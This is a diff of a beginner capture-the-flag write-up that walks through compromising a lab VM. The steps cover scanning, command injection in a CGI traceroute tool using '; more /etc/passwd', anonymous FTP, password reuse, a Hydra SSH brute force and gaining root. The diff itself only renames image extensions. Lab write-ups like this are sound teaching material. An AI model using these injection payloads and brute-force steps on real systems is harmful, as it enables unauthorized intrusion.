@@ -14,14 +14,12 @@ It's designed to be a beginner ctf, if you're new to pen testing, check it out!
 ## Solution
 
 #### 1. Sudo Netdiscover
-
-![](Assets/1.png)
-
+![](Assets/1.PNG)
 > IP address: 192.168.1.10
 
 #### 2. Port scan: Nmap -sC -sV -Pn -A -p- 192.168.1.10
-![](Assets/2.png)
-![](Assets/2.1.png)
+![](Assets/2.PNG)
+![](Assets/2.1.PNG)
 > 21 -> ftp -> vsftpd 3.0.3 -> anonymous
 > 22 -> ssh
 > 80 -> Apache httpd 2.4.27
@@ -32,78 +30,78 @@ It's designed to be a beginner ctf, if you're new to pen testing, check it out!
 > 60000 > unknown
 
 #### 3. Nikto: Nikto -h 192.168.1.10
-![](Assets/3.png)
+![](Assets/3.PNG)
 > passwords/ directory
 > icons/ directory
 
 #### 4. Browser > http://192.168.1.10/passwords/
-![](Assets/4.png)
+![](Assets/4.PNG)
 > FLAG.txt
 > passwords.html
 
 #### 5. Browser > http://192.168.1.10/passwords/FLAG.txt
-![](Assets/5.png)
+![](Assets/5.PNG)
 > Got Flag (10 pt) = total points 20
 
 #### 6. Browser > http://192.168.1.10/passwords.html and page source code
-![](Assets/6.png)
-![](Assets/7.png)
+![](Assets/6.PNG)
+![](Assets/7.PNG)
 > password > winter
 
 #### 7. Browser > http://192.168.1.10/icons/
-![](Assets/8.png)
+![](Assets/8.PNG)
 > nothing special other than directory listing
 
 #### 8. Browser > http://192.168.1.10/robots.txt
-![](Assets/9.png)
+![](Assets/9.PNG)
 > /cgi-bin/root_shell.cgi
 > /cgi-bin/tracertool.cgi
 
 #### 9. Browser > view-source:http://192.168.1.10/cgi-bin/root_shell.cgi
-![](Assets/10.png)
+![](Assets/10.PNG)
 > nothing useful
 
 #### 10. Browser > http://192.168.1.10/cgi-bin/tracertool.cgi
-![](Assets/11.png)
-![](Assets/12.png)
+![](Assets/11.PNG)
+![](Assets/12.PNG)
 > Vulnerable to command injection
-![](Assets/13.png)
+![](Assets/13.PNG)
 > cat command doesn't work. Can use 'more', 'less','head' or 'tail' instead
 
 #### 11. Payload > ; more /etc/passwd
-![](Assets/14.png)
+![](Assets/14.PNG)
 > Note users 'morty', 'ricksanchez' and 'summer'
 
 #### 12. Ftp 192.168.1.10 > anonymous:anonymous 
-![](Assets/15.png)
+![](Assets/15.PNG)
 > logged in
-![](Assets/16.png)
+![](Assets/16.PNG)
 > ftp://192.168.1.10 > Flag.txt (10 pt) => total 30 points
 
 #### 13. ssh 192.168.1.10 22
-![](Assets/17.png)
+![](Assets/17.PNG)
 > Not accessible
 
 #### 14. Browser > http://192.168.1.10:9090
-![](Assets/18.png)
+![](Assets/18.PNG)
 > Got flag (10 pt) => total 40 points
 
 #### 15. Try winter password for users found in step 11 via SSH on 22222 port
-![](Assets/19.png)
+![](Assets/19.PNG)
 > Didn't work
-![](Assets/20.png)
+![](Assets/20.PNG)
 > Worked for user 'Summer'
 > Got flag (10 pt) => total 50 points
-![](Assets/21.png)
+![](Assets/21.PNG)
 > password for unzipping journal.txt.zip is in safe_password.jpg
-![](Assets/22.png)
+![](Assets/22.PNG)
 > Pull jpg file in host machine
-![](Assets/23.png)
+![](Assets/23.PNG)
 > Got safe password
-![](Assets/24.png)
+![](Assets/24.PNG)
 > Got Flag (20 pt) => total 70 points
-![](Assets/25.png)
-![](Assets/26.png)
+![](Assets/25.PNG)
+![](Assets/26.PNG)
 > Used flag in journal.txt as argument for safe
 > Got next flag (20 pt) => total 90 points
 > Got Pattern for RickSanchez password
@@ -126,20 +124,20 @@ if __name__ == '__main__':
 > rickpwd.txt created
 
 #### 17. Hydra -l RickSanchez -P rickpwd.txt 192.168.1.10 ssh -s 22222
-![](Assets/27.png)
+![](Assets/27.PNG)
 > Password for RickSanchez user > P7Curtains
 
 #### 18. ssh RickSanchez@192.168.1.10 -p 22222
-![](Assets/28.png)
-![](Assets/29.png)
+![](Assets/28.PNG)
+![](Assets/29.PNG)
 > Got root and Flag (30 pt) => total 120 points
 
 #### 19. Analyzing remaining ports: telnet 192.168.1.10 13337
-![](Assets/30.png)
+![](Assets/30.PNG)
 > Flag already found
 
 #### 20. nc 192.168.1.10 60000
-![](Assets/31.png)
+![](Assets/31.PNG)
 > Got Flag (10 pt) => total 130 points
 
 > Got all 130/130 points and owned root.
